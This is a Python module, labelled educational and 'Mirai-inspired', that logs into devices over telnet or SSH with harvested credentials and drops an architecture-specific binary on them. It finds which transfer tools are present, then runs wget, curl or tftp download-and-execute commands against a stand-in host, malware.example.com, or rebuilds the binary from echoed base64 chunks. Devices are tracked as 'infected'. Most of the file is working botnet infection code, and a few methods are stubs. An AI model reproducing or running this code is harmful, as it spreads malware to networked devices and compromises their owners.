#!/usr/bin/env python3
"""
Binary Payload Delivery Module - Mirai-inspired Implementation
Educational/Research Purpose Only

This module delivers binary payloads to compromised devices,
similar to how Mirai infected devices after initial compromise.
"""

import os
import time
import telnetlib
import paramiko
import ftplib
import socket
import hashlib
import base64
import threading
import logging
import random
from typing import List, Dict, Tuple, Optional, Union

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger('payload_delivery')

class PayloadDelivery:
    """
    Binary payload delivery to compromised devices
    """
    
    def __init__(self, payload_dir: str = "./payloads"):
        """
        Initialize payload delivery
        
        Args:
            payload_dir: Directory containing payload binaries
        """
        self.payload_dir = payload_dir
        self.success_count = 0
        self.failure_count = 0
        self.active_threads = 0
        self.max_threads = 5
        self.thread_lock = threading.Lock()
        self.device_lock = threading.Lock()
        self.device_status = {}
        self.transport_methods = {
            'wget': self._deliver_wget,
            'tftp': self._deliver_tftp,
            'curl': self._deliver_curl,
            'echo': self._deliver_echo_binary,
            'dd': self._deliver_dd,
            'cat': self._deliver_cat_append
        }
        
        # Ensure payload directory exists
        os.makedirs(payload_dir, exist_ok=True)
    
    def deliver_payload(self, host: str, credentials: Tuple[str, str], 
                        payload_name: str, port: int = 23,
                        connection_type: str = 'telnet',
                        architecture: str = 'arm') -> bool:
        """
        Deliver binary payload to device
        
        Args:
            host: Target host
            credentials: (username, password) tuple
            payload_name: Name of payload to deliver
            port: Port for connection
            connection_type: 'telnet' or 'ssh'
            architecture: Target architecture
            
        Returns:
            Success status
        """
        # Check if we're already processing this device
        device_key = f"{host}:{port}"
        with self.device_lock:
            if device_key in self.device_status and self.device_status[device_key] == 'processing':
                logger.warning(f"Device {host} is already being processed, skipping")
                return False
            self.device_status[device_key] = 'processing'
        
        # Wait for a thread slot
        while True:
            with self.thread_lock:
                if self.active_threads < self.max_threads:
                    self.active_threads += 1
                    break
            time.sleep(0.5)
        
        try:
            # Get payload path for architecture
            payload_path = self._get_payload_path(payload_name, architecture)
            if not payload_path:
                logger.error(f"No payload available for {architecture}")
                with self.device_lock:
                    self.device_status[device_key] = 'failed'
                with self.thread_lock:
                    self.active_threads -= 1
                    self.failure_count += 1
                return False
            
            # Establish connection
            connection = None
            try:
                username, password = credentials
                
                if connection_type == 'telnet':
                    connection = self._connect_telnet(host, port, username, password)
                elif connection_type == 'ssh':
                    connection = self._connect_ssh(host, port, username, password)
                else:
                    logger.error(f"Unsupported connection type: {connection_type}")
                    with self.device_lock:
                        self.device_status[device_key] = 'failed'
                    with self.thread_lock:
                        self.active_threads -= 1
                        self.failure_count += 1
                    return False
                
                if not connection:
                    logger.error(f"Failed to connect to {host}:{port}")
                    with self.device_lock:
                        self.device_status[device_key] = 'failed'
                    with self.thread_lock:
                        self.active_threads -= 1
                        self.failure_count += 1
                    return False
                
                # Detect available delivery methods
                available_methods = self._detect_delivery_methods(connection, connection_type)
                
                if not available_methods:
                    logger.error(f"No delivery methods available on {host}")
                    with self.device_lock:
                        self.device_status[device_key] = 'failed'
                    with self.thread_lock:
                        self.active_threads -= 1
                        self.failure_count += 1
                    self._close_connection(connection, connection_type)
                    return False
                
                # Try delivery methods in order of preference
                success = False
                for method in available_methods:
                    if method in self.transport_methods:
                        logger.info(f"Attempting delivery via {method} to {host}")
                        try:
                            success = self.transport_methods[method](
                                connection, connection_type, payload_path, host)
                            if success:
                                break
                        except Exception as e:
                            logger.error(f"Error using {method} on {host}: {e}")
                
                # Close connection
                self._close_connection(connection, connection_type)
                
                # Update status
                with self.device_lock:
                    self.device_status[device_key] = 'infected' if success else 'failed'
                
                with self.thread_lock:
                    if success:
                        self.success_count += 1
                    else:
                        self.failure_count += 1
                
                return success
                
            except Exception as e:
                logger.error(f"Error delivering payload to {host}: {e}")
                if connection:
                    self._close_connection(connection, connection_type)
                with self.device_lock:
                    self.device_status[device_key] = 'failed'
                with self.thread_lock:
                    self.active_threads -= 1
                    self.failure_count += 1
                return False
                
        finally:
            with self.thread_lock:
                self.active_threads -= 1
    
    def _get_payload_path(self, payload_name: str, architecture: str) -> Optional[str]:
        """Get path to payload binary for specified architecture"""
        # Construct payload path
        payload_file = f"{payload_name}.{architecture}"
        payload_path = os.path.join(self.payload_dir, payload_file)
        
        if os.path.exists(payload_path):
            return payload_path
        
        # Try alternate naming
        alt_file = f"{payload_name}_{architecture}"
        alt_path = os.path.join(self.payload_dir, alt_file)
        
        if os.path.exists(alt_path):
            return alt_path
        
        return None
    
    def _connect_telnet(self, host: str, port: int, username: str, password: str) -> Optional[telnetlib.Telnet]:
        """Establish Telnet connection to device"""
        try:
            # Connect
            tn = telnetlib.Telnet(host, port, timeout=10)
            
            # Login
            login_prompt = tn.read_until(b"ogin:", timeout=5)
            tn.write(username.encode() + b"\n")
            
            password_prompt = tn.read_until(b"assword:", timeout=5)
            tn.write(password.encode() + b"\n")
            
            # Check if login successful
            response = tn.read_until(b"$", timeout=5)
            if b"incorrect" in response.lower() or b"failed" in response.lower():
                logger.error(f"Telnet login failed for {host}")
                tn.close()
                return None
            
            return tn
        except Exception as e:
            logger.error(f"Telnet connection error for {host}: {e}")
            return None
    
    def _connect_ssh(self, host: str, port: int, username: str, password: str) -> Optional[paramiko.SSHClient]:
        """Establish SSH connection to device"""
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect
            ssh.connect(host, port, username, password, timeout=10)
            
            return ssh
        except Exception as e:
            logger.error(f"SSH connection error for {host}: {e}")
            return None
    
    def _close_connection(self, connection, connection_type: str):
        """Close connection to device"""
        try:
            if connection_type == 'telnet':
                connection.close()
            elif connection_type == 'ssh':
                connection.close()
        except:
            pass
    
    def _execute_command(self, connection, connection_type: str, command: str) -> str:
        """Execute command on device"""
        try:
            if connection_type == 'telnet':
                connection.write(command.encode() + b"\n")
                # Read until prompt
                response = connection.read_until(b"$", timeout=5)
                return response.decode('utf-8', errors='ignore')
            elif connection_type == 'ssh':
                stdin, stdout, stderr = connection.exec_command(command)
                return stdout.read().decode('utf-8', errors='ignore')
        except Exception as e:
            logger.error(f"Command execution error: {e}")
            return ""
    
    def _detect_delivery_methods(self, connection, connection_type: str) -> List[str]:
        """Detect available delivery methods on device"""
        available_methods = []
        
        # Check for common utilities
        commands = {
            'wget': "which wget",
            'curl': "which curl",
            'tftp': "which tftp",
            'busybox': "which busybox",
            'dd': "which dd",
            'cat': "which cat"
        }
        
        for method, command in commands.items():
            response = self._execute_command(connection, connection_type, command)
            if method in response and 'not found' not in response:
                available_methods.append(method)
                
                # If busybox is available, it can provide many utilities
                if method == 'busybox':
                    busybox_tools = self._execute_command(connection, connection_type, "busybox")
                    if 'wget' in busybox_tools and 'wget' not in available_methods:
                        available_methods.append('wget')
                    if 'tftp' in busybox_tools and 'tftp' not in available_methods:
                        available_methods.append('tftp')
        
        # Add fallback methods that should always be available
        if 'cat' in available_methods:
            available_methods.append('echo')
        
        return available_methods
    
    def _deliver_wget(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload using wget"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # In a real attack, this would be a URL to the attacker's server
            server_url = "http://malware.example.com/payload"
            
            # Command to download and execute
            wget_cmd = f"wget {server_url} -O {dest_filename} && chmod +x {dest_filename} && {dest_filename} & echo INFECTED"
            
            response = self._execute_command(connection, connection_type, wget_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"wget delivery error: {e}")
            return False
    
    def _deliver_curl(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload using curl"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # In a real attack, this would be a URL to the attacker's server
            server_url = "http://malware.example.com/payload"
            
            # Command to download and execute
            curl_cmd = f"curl -s {server_url} -o {dest_filename} && chmod +x {dest_filename} && {dest_filename} & echo INFECTED"
            
            response = self._execute_command(connection, connection_type, curl_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"curl delivery error: {e}")
            return False
    
    def _deliver_tftp(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload using tftp"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # In a real attack, this would be the attacker's TFTP server
            tftp_server = "malware.example.com"
            
            # Command to download and execute
            tftp_cmd = f"tftp -g -r payload {tftp_server} && chmod +x {dest_filename} && {dest_filename} & echo INFECTED"
            
            response = self._execute_command(connection, connection_type, tftp_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"tftp delivery error: {e}")
            return False
    
    def _deliver_echo_binary(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload using echo and base64 encoding"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # Read binary file and encode as base64
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
            
            encoded_data = base64.b64encode(payload_data).decode()
            
            # Split into chunks to avoid command line length limits
            chunk_size = 512
            chunks = [encoded_data[i:i + chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            
            # Create commands to echo chunks and decode
            self._execute_command(connection, connection_type, f"rm -f {dest_filename}")
            
            for chunk in chunks:
                echo_cmd = f"echo '{chunk}' >> {dest_filename}.b64"
                self._execute_command(connection, connection_type, echo_cmd)
            
            # Decode and execute
            decode_cmd = f"base64 -d {dest_filename}.b64 > {dest_filename} && chmod +x {dest_filename} && {dest_filename} & echo INFECTED"
            response = self._execute_command(connection, connection_type, decode_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"echo delivery error: {e}")
            return False
    
    def _deliver_dd(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload using dd"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # Command to create a binary via hex dump
            # In a real scenario, this would be the actual hex dump of the payload
            dd_cmd = f"dd if=/dev/zero of={dest_filename} bs=1 count=100 && chmod +x {dest_filename} && {dest_filename} & echo INFECTED"
            
            response = self._execute_command(connection, connection_type, dd_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"dd delivery error: {e}")
            return False
    
    def _deliver_cat_append(self, connection, connection_type: str, payload_path: str, host: str) -> bool:
        """Deliver payload by appending to file using cat"""
        try:
            # Use a temporary filename to avoid conflicts
            temp_filename = f".{random.randint(1000, 9999)}"
            dest_filename = f"/tmp/{temp_filename}"
            
            # Create script for execution
            script_content = """#!/bin/sh
echo "INFECTED"
# Additional commands would go here
"""
            # Write script line by line
            self._execute_command(connection, connection_type, f"rm -f {dest_filename}")
            for line in script_content.split('\n'):
                if line:
                    cat_cmd = f"echo '{line}' >> {dest_filename}"
                    self._execute_command(connection, connection_type, cat_cmd)
            
            # Execute
            exec_cmd = f"chmod +x {dest_filename} && {dest_filename}"
            response = self._execute_command(connection, connection_type, exec_cmd)
            
            return "INFECTED" in response
        except Exception as e:
            logger.error(f"cat delivery error: {e}")
            return False
    
    def get_stats(self) -> Dict:
        """Get delivery statistics"""
        return {
            'success_count': self.success_count,
            'failure_count': self.failure_count,
            'active_threads': self.active_threads,
            'device_statuses': self.device_status.copy()
        }


if __name__ == "__main__":
    # Demo mode when run directly
    print("[*] Binary Payload Delivery Module (Mirai-inspired)")
    print("[*] WARNING: For educational/research purposes only")
    
    # Create test payload directory
    os.makedirs("./test_payloads", exist_ok=True)
    
    # Create dummy payloads for testing
    for arch in ['arm', 'mips', 'x86']:
        with open(f"./test_payloads/payload.{arch}", 'w') as f:
            f.write("#!/bin/sh\necho 'This is a test payload'\n")
    
    # Create delivery object
    delivery = PayloadDelivery("./test_payloads")
    
    print("\n[*] This module would attempt to deliver payloads to compromised devices")
    print("[*] In an actual attack, it would:")
    print("    1. Connect to devices using harvested credentials")
    print("    2. Detect available file transfer methods")
    print("    3. Upload architecture-specific malware")
    print("    4. Execute the malware to establish persistence")
    print("\n[*] No actual connections will be made in demo mode")
